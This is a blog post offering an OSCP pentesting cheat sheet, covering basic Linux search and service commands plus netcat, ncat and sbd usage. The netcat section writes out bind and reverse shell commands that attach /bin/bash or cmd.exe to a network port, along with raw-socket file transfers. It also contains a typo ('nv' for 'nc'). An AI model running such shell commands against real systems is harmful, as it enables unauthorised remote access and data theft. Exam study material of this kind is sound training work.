---
layout: post
title:  "Pentesting Summary"
categories: "Windows Linux"
tags:  windows linux pentest 
author: Trelis
---

* content
{:toc}

A summary of all the commands and concepts needed to pass the OSCP exam.




# General commands
## Locate
Before using locate, you should update de database:
```
updatedb
```

Once de database has been built, we can use locate to find a file of which we know the name. The search will be fast due the database has an index of all the local files.
```
locate FILE.EXE
```

## Which
This command searches for a given name through all the folders that are defined in the enviroment variable $PATH:
```
which FILE
```

## Find
Find is able to recursively search any given path for various files. It is more aggressive than locate and which:
```
find / -name FILE
```

For example, if we want to find all files named test:
```
find / -name test*
```

## Netstat
It shows all the services running and listening on a port:
```
netstat -antp | grep SERVICE
```

## Systemctl
In order to start or stop a service, we can use the command systemctl:
```
systemctl start SERVICE
systemctl stop SERVICE
```

If we want to have the service starting automatically  at boot time, we can use the options enable or disable:
```
systemctl enable SERVICE
systemctl disable SERVICE
```

# Essential Tools
## Netcat
```
Connect
nc -nv IP PORT [-e /bin/bash or cmd.exe]

Listen
nc -nlvp PORT [-e /bin/bash or cmd.exe]

* -e redirects the input, output and error messages to the PORT rather than the default console. So it binds the shell to a local port. Anyone who connects to the port will find a command prompt.

Transfer file 
nc -nv IP PORT < FILE.TXT

Receive file
nv -nlvp PORT > FILE.TXT


## Ncat
It is a reimplementation of Netcat. It is the same but allows to create encrypted communications:
```
Connect
ncat -v IP PORT -ssl

Listen
ncat --exec cmd.exe --allow IP -vnl PORT --ssl
```

## sbd
sbd is a Netcat-clone, designed to be portable and offer strong encryption:
```
Connect
sbd IP PORT

Listen
sbd -l -p PORT -e [bash/cmd.exe] -v -n
```




